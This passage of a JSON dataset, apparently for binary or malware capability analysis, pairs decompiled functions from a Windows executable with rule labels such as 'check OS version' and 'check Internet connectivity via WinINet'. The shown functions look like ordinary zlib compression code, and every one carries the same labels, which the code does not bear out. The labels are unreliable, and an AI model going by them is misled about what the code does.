in_EAX[0x11] = (uVar1 << (in_EAX[0x15] & 0x1f) ^ *(in_EAX[0xd] + 1 + in_EAX[0x1a])) & in_EAX[0x14];\n        }\n        if (0x105 < in_EAX[0x1c]) {\n            return;\n        }\n        if (*(*in_EAX + 4) == 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 729
    },
    "004487c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004487c8(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    \n    if ((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) {\n        puVar2 = *(in_EAX + 0x1c);\n        puVar2[7] = 0;\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *(in_EAX + 0x30) = 1;\n        *puVar2 = 0;\n        puVar2[1] = 0;\n        puVar2[3] = 0;\n        puVar2[5] = 0x8000;\n        puVar2[9] = 0;\n        puVar2[10] = 0;\n        puVar2[0xb] = 0;\n        puVar2[0xd] = 0;\n        puVar1 = puVar2 + 0x14b;\n        puVar2[0xe] = 0;\n        puVar2[0x1a] = puVar1;\n        puVar2[0x13] = puVar1;\n        puVar2[0x12] = puVar1;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 323
    },
    "00448880": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00448880(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char *in_ECX;\n    int32_t in_EDX;\n    int32_t var_4h;\n    \n    if (((in_ECX == NULL) || (*in_ECX != *0x4a344a)) || (arg_8h != 0x38)) {\n        uVar1 = 0xfffffffa;\n    }\n    else if (in_EAX == 0) {\n        uVar1 = 0xfffffffe;\n    }\n    else {\n        *(in_EAX + 0x18) = 0;\n        if (*(in_EAX + 0x20) == 0) {\n            *(in_EAX + 0x20) = 0x446598;\n            *(in_EAX + 0x28) = 0;\n        }\n        if (*(in_EAX + 0x24) == 0) {\n            *(in_EAX + 0x24) = 0x4465a4;\n        }\n        iVar2 = (**(in_EAX + 0x20))();\n        if (iVar2 == 0) {\n            uVar1 = 0xfffffffc;\n        }\n        else {\n            *(in_EAX + 0x1c) = iVar2;\n            if (in_EDX < 0) {\n                *(iVar2 + 8) = 0;\n                var_4h = -in_EDX;\n            }\n            else {\n                *(iVar2 + 8) = (in_EDX >> 4) + 1;\n                var_4h = in_EDX;\n            }\n            if ((var_4h < 8) || (0xf < var_4h)) {\n                (**(in_EAX + 0x24))();\n                uVar1 = 0xfffffffe;\n                *(in_EAX + 0x1c) = 0;\n            }\n            else {\n                *(iVar2 + 0x20) = var_4h;\n                *(iVar2 + 0x30) = 0;\n                uVar1 = fcn.004487c8();\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 497
    },
    "0044897c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044897c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    iVar1 = *(in_EAX + 0x1c);\n    if (*(iVar1 + 0x30) == 0) {\n        iVar2 = (**(in_EAX + 0x20))();\n        *(iVar1 + 0x30) = iVar2;\n        if (iVar2 == 0) {\n            uVar3 = 1;\n            goto code_r0x00448a7b;\n        }\n    }\n    if (*(iVar1 + 0x24) == 0) {\n        *(iVar1 + 0x24) = 1 << (*(iVar1 + 0x20) & 0x1f);\n        *(iVar1 + 0x2c) = 0;\n        *(iVar1 + 0x28) = 0;\n    }\n    uVar4 = param_2 - *(in_EAX + 0x10);\n    uVar5 = *(iVar1 + 0x24);\n    if (uVar4 < uVar5) {\n        uVar5 = *(iVar1 + 0x24) - *(iVar1 + 0x2c);\n        if (uVar4 < uVar5) {\n            uVar5 = uVar4;\n        }\n        fcn.004465c0(*(iVar1 + 0x30) + *(iVar1 + 0x2c), *(in_EAX + 0xc) - uVar4, uVar5);\n        iVar2 = uVar4 - uVar5;\n        if (iVar2 == 0) {\n            *(iVar1 + 0x2c) = *(iVar1 + 0x2c) + uVar5;\n            if (*(iVar1 + 0x2c) == *(iVar1 + 0x24)) {\n                *(iVar1 + 0x2c) = 0;\n            }\n            if (*(iVar1 + 0x28) < *(iVar1 + 0x24)) {\n                *(iVar1 + 0x28) = *(iVar1 + 0x28) + uVar5;\n            }\n        }\n        else {\n            fcn.004465c0(*(iVar1 + 0x30), *(in_EAX + 0xc) - iVar2, iVar2);\n            *(iVar1 + 0x2c) = iVar2;\n            *(iVar1 + 0x28) = *(iVar1 + 0x24);\n        }\n    }\n    else {\n        fcn.004465c0(*(iVar1 + 0x30), *(in_EAX + 0xc) - uVar5, uVar5);\n        *(iVar1 + 0x2c) = 0;\n        *(iVar1 + 0x28) = *(iVar1 + 0x24);\n    }\n    uVar3 = 0;\ncode_r0x00448a7b:\n    return CONCAT44(in_EAX, uVar3);\n}\n",
        "token_count": 701
    },
    "0044993c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044993c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        if (*(*(in_EAX + 0x1c) + 0x30) != 0) {\n            (**(in_EAX + 0x24))();\n        }\n        (**(in_EAX + 0x24))();\n        *(in_EAX + 0x1c) = 0;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 147
    },
    "00449cac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00449cac(uint16_t *arg_8h, uint32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    int32_t in_EAX;\n    uint *puVar5;\n    uint uVar6;\n    uint16_t *puVar7;\n    uint32_t uVar8;\n    uint32_t in_ECX;\n    int32_t iVar9;\n    uint8_t uVar10;\n    uint16_t *in_EDX;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint16_t var_84h;\n    uint var_82h;\n    uint var_64h;\n    uint16_t *var_46h;\n    int32_t var_40h;\n    uint16_t *var_3ch;\n    uint16_t *var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint16_t *var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    puVar5 = &var_64h;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    do {\n        *puVar5 = 0;\n        var_ch = var_ch + 1;\n        puVar5 = puVar5 + 2;\n    } while (var_ch < 0x10);\n    uVar11 = 0;\n    puVar7 = var_8h;\n    if (in_ECX != 0) {\n        do {\n            uVar3 = *puVar7;\n            puVar7 = puVar7 + 1;\n            uVar11 = uVar11 + 1;\n            piVar1 = &var_64h + uVar3 * 2;\n            *piVar1 = *piVar1 + 1;\n        } while (uVar11 < in_ECX);\n    }\n    puVar5 = &var_46h;\n    var_18h = *arg_ch;\n    var_14h = 0xf;\n    do {\n        if (*puVar5 != 0) break;\n        var_14h = var_14h - 1;\n        puVar5 = puVar5 + -2;\n    } while (var_14h != 0);\n    if (var_14h < *arg_ch) {\n        var_18h = var_14h;\n    }\n    if (var_14h == 0) {\n        puVar5 = *arg_10h;\n        *arg_10h = *arg_10h + 4;\n        *puVar5 = 0x140;\n        puVar5 = *arg_10h;\n        *arg_10h = *arg_10h + 4;\n        *puVar5 = 0x140;\n        uVar6 = 0;\n        *arg_ch = 1;\n    }\n    else {\n        var_10h = 1;\n        stack0xffffffb8 = &var_64h + 2;\n        do {\n            if (*stack0xffffffb8 != 0) break;\n            var_10h = var_10h + 1;\n            stack0xffffffb8 = stack0xffffffb8 + 1;\n        } while (var_10h < 0x10);\n        if (var_18h < var_10h) {\n            var_18h = var_10h;\n        }\n        var_ch = 1;\n        iVar12 = 1;\n        puVar7 = &var_64h + 2;\n        do {\n            iVar12 = iVar12 * 2 - *puVar7;\n            if (iVar12 < 0) {\n                return 0xffffffff;\n            }\n            var_ch = var_ch + 1;\n            puVar7 = puVar7 + 1;\n        } while (var_ch < 0x10);\n        if ((iVar12 < 1) || ((var_4h != 0 && (var_14h == 1)))) {\n            var_82h._0_2_ = 0;\n            var_ch = 1;\n            puVar5 = &var_82h;\n            stack0xffffffb8 = &var_64h + 2;\n            do {\n                *(puVar5 + 2) = *puVar5 + *stack0xffffffb8;\n                puVar5 = puVar5 + 2;\n                var_ch = var_ch + 1;\n                stack0xffffffb8 = stack0xffffffb8 + 1;\n            } while (var_ch < 0xf);\n            uVar11 = 0;\n            stack0xffffffb8 = var_8h;\n            if (in_ECX != 0) {\n                do {\n                    uVar3 = *stack0xffffffb8;\n                    if (uVar3 != 0) {\n                        uVar2 = (&var_84h)[uVar3];\n                        (&var_84h)[uVar3] = (&var_84h)[uVar3] + 1;\n                        arg_8h[uVar2] = uVar11;\n                    }\n                    uVar11 = uVar11 + 1;\n                    stack0xffffffb8 = stack0xffffffb8 + 1;\n                } while (uVar11 < in_ECX);\n            }\n            if (var_4h == 0) {\n                var_3ch = arg_8h;\n                var_38h = arg_8h;\n                var_40h = 0x13;\n            }\n            else if (var_4h == 1) {\n                var_38h = 0x4a33b2;\n                var_3ch = 0x4a33f0;\n                var_40h = 0x100;\n            }\n            else {\n                var_38h = 0x4a3630;\n                var_3ch = 0x4a3670;\n                var_40h = -1;\n            }\n            var_ch = var_10h;\n            uVar11 = 0;\n            var_34h = *arg_10h;\n            var_1ch = 0;\n            var_28h = 0xffffffff;\n            var_20h = 1 << (var_18h & 0x1f);\n            var_2ch = var_20h - 1;\n            if ((var_4h != 1) || (var_20h < 0x5b0)) {\n                stack0xffffffb8 = arg_8h;\n                uVar8 = var_18h;\n                while( true ) {\n                    do {\n                        uVar4 = var_ch;\n                        uVar10 = var_ch - var_1ch;\n                        uVar13 = *stack0xffffffb8;\n                        if (uVar13 < var_40h) {\n                            var_30h = uVar10 << 8;\n                            var_30h = var_30h | *stack0xffffffb8 << 0x10;\n                        }\n                        else if (var_40h < uVar13) {\n                            var_30h = CONCAT22(var_38h[uVar13], CONCAT11(uVar10, *(var_3ch + uVar13)));\n                        }\n                        else {\n                            var_30h = CONCAT31(uVar10, 0x60);\n                        }\n                        var_24h = 1 << (uVar8 & 0x1f);\n                        var_10h = var_24h;\n                        do {\n                            var_24h = var_24h - (1 << (var_ch - var_1ch & 0x1f));\n                            *(var_34h + ((uVar11 >> (var_1ch & 0x1f)) + var_24h) * 4) = var_30h;\n                        } while (var_24h != 0);\n                        for (uVar13 = 1 << (var_ch - 1U & 0x1f); (uVar13 & uVar11) != 0; uVar13 = uVar13 >> 1) {\n                        }\n                        if (uVar13 == 0) {\n                            uVar11 = 0;\n                        }\n                        else {\n                            uVar11 = (uVar11 & uVar13 - 1) + uVar13;\n                        }\n                        stack0xffffffb8 = stack0xffffffb8 + 1;\n                        piVar1 = &var_64h + var_ch * 2;\n                        *piVar1 = *piVar1 + -1;\n                        if (*(&var_64h + uVar4 * 2) == 0) {\n                            if (var_ch == var_14h) {\n                                var_30h._0_2_ = CONCAT11(var_ch - var_1ch, 0x40);\n                                var_30h = var_30h;\n                                while (uVar11 != 0) {\n                                    if ((var_1ch != 0) && ((var_2ch & uVar11) != var_28h)) {\n                                        var_1ch = 0;\n                                        var_ch = var_18h;\n                                        var_34h = *arg_10h;\n                                        var_30h._0_2_ = CONCAT11(var_18h, var_30h);\n                                        var_30h = var_30h;\n                                    }\n                                    *(var_34h + (uVar11 >> (var_1ch & 0x1f)) * 4) = var_30h;\n                                    for (uVar8 = 1 << (var_ch - 1U & 0x1f); (uVar8 & uVar11) != 0; uVar8 = uVar8 >> 1) {\n                                    }\n                                    if (uVar8 == 0) {\n                                        uVar11 = 0;\n                                    }\n                                    else {\n                                        uVar11 = (uVar11 & uVar8 - 1) + uVar8;\n                                    }\n                                }\n                                *arg_10h = *arg_10h + var_20h * 4;\n                                *arg_ch = var_18h;\n                                return 0;\n                            }\n                            var_ch = var_8h[*stack0xffffffb8];\n                        }\n                    } while ((var_ch <= var_18h) || ((var_2ch & uVar11) == var_28h));\n                    if (var_1ch == 0) {\n                        var_1ch = var_18h;\n                    }\n                    var_34h = var_34h + var_10h * 4;\n                    uVar8 = var_ch - var_1ch;\n                    for (iVar12 = 1 << (uVar8 & 0x1f);\n                        (var_1ch + uVar8 < var_14h &&\n                        (iVar12 = iVar12 - *(&var_64h + (var_1ch + uVar8) * 2),  0 < iVar12)); iVar12 = iVar12 * 2) {\n                        uVar8 = uVar8 + 1;\n                    }\n                    var_20h = var_20h + (1 << (uVar8 & 0x1f));\n                    if ((var_4h == 1) && (0x5af < var_20h)) break;\n                    var_28h = var_2ch & uVar11;\n                    iVar12 = *arg_10h;\n                    *(iVar12 + var_28h * 4) = uVar8;\n                    *(iVar12 + 1 + var_28h * 4) = var_18h;\n                    iVar9 = var_34h - iVar12;\n                    if (iVar9 < 0) {\n                        iVar9 = iVar9 + 3;\n                    }\n                    *(iVar12 + 2 + var_28h * 4) = iVar9 >> 2;\n                }\n                return 1;\n            }\n            uVar6 = 1;\n        }\n        else {\n            uVar6 = 0xffffffff;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 2744
    },
    "0044a2f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a2f0(uint param_1, int32_t *param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    int32_t *piVar7;\n    ushort *puVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack24;\n    \n    iVar3 = param_2[1];\n    iVar4 = *param_2;\n    piVar7 = param_2[2];\n    iVar12 = *piVar7;\n    iVar5 = piVar7[1];\n    iVar6 = piVar7[2];\n    uVar13 = piVar7[4];\n    iStack24 = 0;\n    iVar10 = 0;\n    puVar8 = in_EAX + 0xb38;\n    do {\n        *puVar8 = 0;\n        iVar10 = iVar10 + 1;\n        puVar8 = puVar8 + 1;\n    } while (iVar10 < 0x10);\n    *(iVar4 + 2 + *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) * 4) = 0;\n    iStack36 = *(in_EAX + 0x1450) + 1;\n    piVar7 = in_EAX + 0xb58 + iStack36 * 4;\n    for (; iStack36 < 0x23d; iStack36 = iStack36 + 1) {\n        iVar10 = *piVar7;\n        uVar11 = *(iVar4 + 2 + *(iVar4 + 2 + iVar10 * 4) * 4) + 1;\n        if (uVar13 < uVar11) {\n            iStack24 = iStack24 + 1;\n            uVar11 = uVar13;\n        }\n        *(iVar4 + 2 + iVar10 * 4) = uVar11;\n        if (iVar10 <= iVar3) {\n            piVar9 = in_EAX + 0xb38 + uVar11 * 2;\n            *piVar9 = *piVar9 + 1;\n            iStack32 = 0;\n            if (iVar6 <= iVar10) {\n                iStack32 = *(iVar5 + (iVar10 - iVar6) * 4);\n            }\n            uVar2 = *(iVar4 + iVar10 * 4);\n            *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + uVar2 * (uVar11 + iStack32);\n            if (iVar12 != 0) {\n                *(in_EAX + 0x16a8) = *(in_EAX + 0x16a8) + (*(iVar12 + 2 + iVar10 * 4) + iStack32) * uVar2;\n            }\n        }\n        piVar7 = piVar7 + 1;\n    }\n    if (iStack24 != 0) {\n        do {\n            iVar12 = uVar13 - 1;\n            for (piVar9 = in_EAX + 0xb38 + iVar12 * 2; *piVar9 == 0; piVar9 = piVar9 + -1) {\n                iVar12 = iVar12 + -1;\n            }\n            piVar9 = in_EAX + 0xb38 + iVar12 * 2;\n            *piVar9 = *piVar9 + -1;\n            piVar9 = in_EAX + 0xb3a + iVar12 * 2;\n            *piVar9 = *piVar9 + 2;\n            piVar9 = in_EAX + 0xb38 + uVar13 * 2;\n            *piVar9 = *piVar9 + -1;\n            iStack24 = iStack24 + -2;\n        } while (0 < iStack24);\n        puVar1 = in_EAX + 0xb38 + uVar13 * 2;\n        for (; uVar13 != 0; uVar13 = uVar13 - 1) {\n            uVar11 = *puVar1;\n            while (piVar7 = in_EAX + 0xb58 + iStack36 * 4,  uVar11 != 0) {\n                while( true ) {\n                    iStack36 = iStack36 + -1;\n                    piVar7 = piVar7 + -1;\n                    iVar12 = *piVar7;\n                    if (iVar3 < iVar12) break;\n                    if (*(iVar4 + 2 + iVar12 * 4) != uVar13) {\n                        *(in_EAX + 0x16a4) =\n                             *(in_EAX + 0x16a4) + (uVar13 - *(iVar4 + 2 + iVar12 * 4)) * *(iVar4 + iVar12 * 4);\n                        *(iVar4 + 2 + iVar12 * 4) = uVar13;\n                    }\n                    uVar11 = uVar11 - 1;\n                    if (uVar11 == 0) goto code_r0x0044a4dd;\n                }\n            }\ncode_r0x0044a4dd:\n            puVar1 = puVar1 + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 1232
    },
    "0044a560": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a560(uint param_1, int16_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    int16_t *piVar5;\n    char cVar6;\n    uchar *puVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int16_t *piStack20;\n    \n    piVar8 = NULL;\n    piVar3 = *param_2;\n    iVar9 = *param_2[2];\n    puVar7 = in_EAX + 0x1454;\n    iVar10 = *(param_2[2] + 0xc);\n    piStack20 = 0xffffffff;\n    *(in_EAX + 0x144c) = 0;\n    *(in_EAX + 0x1450) = 0x23d;\n    piVar5 = piVar3;\n    if (0 < iVar10) {\n        do {\n            if (*piVar5 == 0) {\n                piVar5[1] = 0;\n            }\n            else {\n                *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + 1;\n                *(in_EAX + 0xb58 + *(in_EAX + 0x144c) * 4) = piVar8;\n                *puVar7 = 0;\n                piStack20 = piVar8;\n            }\n            piVar8 = piVar8 + 1;\n            puVar7 = puVar7 + 1;\n            piVar5 = piVar5 + 2;\n        } while (piVar8 < iVar10);\n    }\n    while (*(in_EAX + 0x144c) < 2) {\n        if (piStack20 < 2) {\n            piVar5 = piStack20 + 1;\n            piStack20 = piVar5;\n        }\n        else {\n            piVar5 = NULL;\n        }\n        *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + 1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x144c) * 4) = piVar5;\n        piVar3[piVar5 * 2] = 1;\n        *(in_EAX + 0x1454 + piVar5) = 0;\n        *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + -1;\n        if (iVar9 != 0) {\n            *(in_EAX + 0x16a8) = *(in_EAX + 0x16a8) - *(iVar9 + 2 + piVar5 * 4);\n        }\n    }\n    param_2[1] = piStack20;\n    iVar9 = *(in_EAX + 0x144c) >> 1;\n    if (iVar9 < 0) {\n        iVar9 = iVar9 + ((*(in_EAX + 0x144c) & 1) != 0);\n    }\n    for (; 0 < iVar9; iVar9 = iVar9 + -1) {\n        fcn.0044a1fc();\n    }\n    do {\n        iVar9 = *(in_EAX + 0x144c);\n        iVar4 = *(in_EAX + 0xb5c);\n        *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + -1;\n        *(in_EAX + 0xb5c) = *(in_EAX + 0xb58 + iVar9 * 4);\n        fcn.0044a1fc();\n        iVar9 = *(in_EAX + 0xb5c);\n        *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = iVar4;\n        *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = iVar9;\n        piVar3[iVar10 * 2] = piVar3[iVar9 * 2] + piVar3[iVar4 * 2];\n        uVar2 = *(in_EAX + 0x1454 + iVar9);\n        puVar1 = in_EAX + 0x1454 + iVar4;\n        if (uVar2 < *puVar1 || uVar2 == *puVar1) {\n            cVar6 = *(in_EAX + 0x1454 + iVar4);\n        }\n        else {\n            cVar6 = *(in_EAX + 0x1454 + iVar9);\n        }\n        *(in_EAX + 0x1454 + iVar10) = cVar6 + '\\x01';\n        piVar3[iVar9 * 2 + 1] = iVar10;\n        piVar3[iVar4 * 2 + 1] = iVar10;\n        *(in_EAX + 0xb5c) = iVar10;\n        iVar10 = iVar10 + 1;\n        fcn.0044a1fc();\n    } while (1 < *(in_EAX + 0x144c));\n    *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n    *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = *(in_EAX + 0xb5c);\n    fcn.0044a2f0();\n    fcn.0044a4f0();\n    return;\n}\n",
        "token_count": 1313
    },
    "0044af04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044af04(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    \n    fcn.0044a770();\n    fcn.0044a770();\n    fcn.0044a560();\n    iVar1 = 0x12;\n    puVar2 = 0x4a3e4a;\n    do {\n        if (*(in_EAX + 0xa7a + *puVar2 * 4) != 0) break;\n        iVar1 = iVar1 + -1;\n        puVar2 = puVar2 + -1;\n    } while (2 < iVar1);\n    *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + iVar1 * 3 + 0x11;\n    return;\n}\n",
        "token_count": 191
    },
    "0044b8c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b8c0(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int16_t iVar8;\n    uint32_t uVar9;\n    uint32_t uStack32;\n    \n    uStack32 = 0;\n    if (*(in_EAX + 0x169c) != 0) {\n        do {\n            uVar7 = *(*(in_EAX + 0x16a0) + uStack32 * 2);\n            uVar9 = *(*(in_EAX + 0x1694) + uStack32);\n            uStack32 = uStack32 + 1;\n            if (uVar7 == 0) {\n                uVar7 = *(param_2 + 2 + uVar9 * 4);\n                if (0x10 - uVar7 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_2 + uVar9 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar7 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_2 + uVar9 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar7;\n                }\n            }\n            else {\n                uVar6 = *(uVar9 + 0x4a404b);\n                uVar5 = *(param_2 + 0x406 + uVar6 * 4);\n                if (0x10 - uVar5 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_2 + 0x404 + uVar6 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar5 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) =\n                         *(in_EAX + 0x16b4) | *(param_2 + 0x404 + uVar6 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar5;\n                }\n                iVar3 = *(uVar6 * 4 + 0x4a36e0);\n                if (iVar3 != 0) {\n                    uVar9 = uVar9 - *(uVar6 * 4 + 0x4a3d10);\n                    iVar8 = uVar9;\n                    if (0x10 - iVar3 < *(in_EAX + 0x16b8)) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (uVar9 & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = iVar3 + -0x10 + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + iVar3;\n                    }\n                }\n                uVar9 = uVar7 - 1;\n                if (uVar9 < 0x100) {\n                    uVar1 = *(uVar7 + 0x4a3e4a);\n                }\n                else {\n                    uVar1 = *((uVar9 >> 7) + 0x4a3f4b);\n                }\n                uVar7 = uVar1;\n                uVar5 = *(param_1 + 2 + uVar7 * 4);\n                if (0x10 - uVar5 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_1 + uVar7 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar5 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) = 